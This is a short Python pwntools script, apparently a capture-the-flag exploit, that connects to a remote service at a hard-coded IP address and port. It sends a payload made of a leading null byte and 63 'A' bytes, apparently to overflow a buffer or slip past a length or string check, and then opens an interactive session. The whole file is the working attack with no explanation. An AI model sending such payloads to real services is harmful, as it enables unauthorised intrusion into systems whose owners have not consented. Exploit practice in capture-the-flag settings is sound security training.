from pwn import *

s = remote('34.146.101.4', 30007)

payload = b'\x00'
payload += b'A' * 63

s.sendline(payload)
s.interactive()
